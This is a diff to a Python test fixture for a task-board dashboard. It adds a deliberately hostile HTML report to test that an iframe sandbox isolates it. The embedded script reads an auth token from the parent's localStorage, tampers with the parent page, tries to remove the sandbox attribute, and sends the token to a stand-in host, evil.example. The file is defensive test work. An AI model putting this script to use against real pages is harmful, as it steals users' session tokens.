@@ -397,6 +397,39 @@ MARKDOWN_RULES = [
 ]
 
 
+#: A report with a HOSTILE script in it, committed for real.
+#:
+#: The chapter's fourth acceptance criterion is that a report with a `<script>`
+#: tag cannot read the dashboard's token, and a fixture that carried harmless
+#: HTML would pin nothing: the assertion is that these exact bytes reach the
+#: reader as an iframe's `srcdoc` under a sandbox with no `allow-same-origin`,
+#: so the script is loaded, runs in an OPAQUE origin, and finds no parent to
+#: read. Every line of it is something a real attacker would try — the token in
+#: `localStorage`, the parent document, and stripping the sandbox attribute off
+#: the frame from inside it.
+A_HOSTILE_REPORT = """<!doctype html>
+<html><body>
+<h1>Chapter panorama</h1>
+<p>Twelve cards, four workers, one bundle rebuild.</p>
+<script>
+  const stolen = parent.localStorage.getItem("taskops:http://localhost:7777");
+  parent.document.title = stolen;
+  window.frameElement.removeAttribute("sandbox");
+  fetch("https://evil.example/" + stolen);
+</script>
+</body></html>
+"""
+
+#: The other half of the door's `content_type`: a report that is NOT html. It
+#: must reach the screen as TEXT — the `<script>` in it drawn as the eight
+#: characters it is — and never as markup, which is what the `text/plain` branch
+#: of `ReportFrame` exists for.
+A_TEXT_REPORT = """# Field notes
+
+The importer landed. `<script>alert(1)</script>` was in the CSV and is prose here.
+"""
+
+
 def a_clone(root: Path) -> Path:
     """A real two-branch repo, so the /git door has something true to answer.
 
@@ -404,6 +437,12 @@ def a_clone(root: Path) -> Path:
     one: git is the point. `main` moves after the branch is cut, which is what
     makes merge-base(main, feature) → feature a different answer from `main
     ..feature` and keeps the compare honest.
+
+    The two REPORT files are committed in the FIRST commit on purpose. They are
+    then on both sides of merge-base(main, tk-a11111) → tk-a11111, so the
+    compare's `stat` is still exactly `pdf.py` and `tax.py` — the shape
+    `ui/smoke/sections/git-diff.tsx` pins — while the file door has something
+    real to serve at a rev.
     """
     from taskops.gitwork import run
 
@@ -412,6 +451,10 @@ def a_clone(root: Path) -> Path:
     run.must("config", "user.email", "test@example.com", cwd=root)
     run.must("config", "user.name", "Test", cwd=root)
     (root / "tax.py").write_text("RATE = 0.22\n", encoding="utf-8")
+    filed = root / ".taskops" / "reports"
+    filed.mkdir(parents=True)
+    (filed / "panorama.html").write_text(A_HOSTILE_REPORT, encoding="utf-8")
+    (filed / "notes.md").write_text(A_TEXT_REPORT, encoding="utf-8")
     run.must("add", "-A", cwd=root)
     run.must("commit", "-q", "-m", "first", cwd=root)
     run.must("checkout", "-q", "-b", "tk-a11111", cwd=root)
@@ -434,9 +477,17 @@ def a_diff(root: Path) -> dict[str, Any]:
     The third one is the everyday case on a shared board: `tk-b22222` is another
     dev's card, whose branch is on the server's board and on origin but has never
     been fetched into this clone.
+
+    `file`, `text_file` and `not_a_report` are the same three ends for the FILE
+    question (tk-9ebbc3): the bytes of an html report and of a text one, both
+    with their `content_type` decided by the door and not by the reader, and the
+    door's own refusal of a path that is not a report. The refusal travels for
+    the same reason `no_repo` does — it is what the Reports page QUOTES when
+    there is nothing to draw, and a sentence written by hand here would pass
+    while the real one never reached a screen.
     """
     from taskops.http import gitdoor
-    from taskops._errors import NotFound
+    from taskops._errors import NotFound, BadRequest
 
     clone = a_clone(root)
     compare = gitdoor.answer(clone, "compare/main...tk-a11111", "")
@@ -452,7 +503,20 @@ def a_diff(root: Path) -> dict[str, Any]:
         stale = str(refusal)
     else:  # pragma: no cover - the door must refuse a ref this clone lacks
         stale = ""
-    return {"compare": compare, "no_repo": no_repo, "stale": stale}
+    try:
+        gitdoor.answer(clone, "file/main", "path=tax.py")
+    except BadRequest as refusal:
+        not_a_report = str(refusal)
+    else:  # pragma: no cover - the door is not a file server
+        not_a_report = ""
+    return {
+        "compare": compare,
+        "no_repo": no_repo,
+        "stale": stale,
+        "file": gitdoor.answer(clone, "file/main", "path=.taskops/reports/panorama.html"),
+        "text_file": gitdoor.answer(clone, "file/main", "path=.taskops/reports/notes.md"),
+        "not_a_report": not_a_report,
+    }
 
 
 needs_node = pytest.mark.skipif(
@@ -530,8 +594,12 @@ def a_board(root: Path) -> dict[str, Any]:
     production. `expect` and `expect_board` travel with it — this side names the
     strings it put on the board, the harness proves they reached the screen.
     """
+    # The clone FIRST: the reports registered below point at the very shas and
+    # paths this answer carries, so the fixture's list and the fixture's bytes
+    # are one fact rather than two that can drift.
+    answers = a_diff(root.parent / "clone")
     dev = LocalBoard(root, "dev:berna")
-    cards = dev.call(
+    planned = dev.call(
         "plan",
         {
             "milestone": "MVP facturador",
@@ -561,7 +629,8 @@ def a_board(root: Path) -> dict[str, Any]:
                 {"title": "PDF", "spec": "render", "files": ["src/pdf.py"], "after": 1},
             ],
         },
-    )["cards"]
+    )
+    cards = planned["cards"]
     dev.call("assign", {"tasks": [cards[0]["id"]]})
     worker = LocalBoard(root, "agent:berna/w2")
     worker.call("take", {"task": cards[1]["id"]})
@@ -606,6 +675,28 @@ def a_board(root: Path) -> dict[str, Any]:
     )
     dev.call("merged", {"milestone": past["milestone"]["id"], "into": "main", "sha": "beef1234"})
 
+    # TWO REPORTS on the open chapter, registered through the board's own write
+    # door (`verbs/filed.py`) — never a hand-written row, for the reason the rest
+    # of this fixture is the server's answer. `path` and `sha` are the door's, so
+    # the list on screen and the bytes behind it name the same file at the same
+    # commit, which is exactly the pair a reader composes into a /git route.
+    # `milestone=` is named rather than left to the single-open-chapter bargain:
+    # this board has a landed chapter too, and a fixture should not depend on
+    # which one `_facts.open_milestone` resolves.
+    for answer, title in (
+        (answers["file"], "Chapter panorama — twelve cards, end to end"),
+        (answers["text_file"], "Field notes from the importer"),
+    ):
+        dev.call(
+            "filed",
+            {
+                "milestone": planned["milestone"]["id"],
+                "path": answer["path"],
+                "title": title,
+                "sha": answer["rev"],
+            },
+        )
+
     fixture: dict[str, Any] = {
         # `window=` is what makes `hours` exist at all (verbs/pulse.py::run), and
         # `useBoard` passes it on every call so Throughput draws real bars.
@@ -638,9 +729,10 @@ def a_board(root: Path) -> dict[str, Any]:
             "VAT",  # the epic, resolved
             "a3f9c21b",  # the commit, with its subject
         ],
-        # The /git door's own answer over a real clone, and its own refusal on a
-        # host that has none — the two ends of the cascade (ARCHITECTURE.md §16).
-        "git": a_diff(root.parent / "clone"),
+        # The /git door's own answers over a real clone — a range, one committed
+        # report's bytes, and its own refusals (no clone here, a ref this clone
+        # lacks, a path that is not a report). ARCHITECTURE.md §16.
+        "git": answers,
     }
     dev.close()
     worker.close()
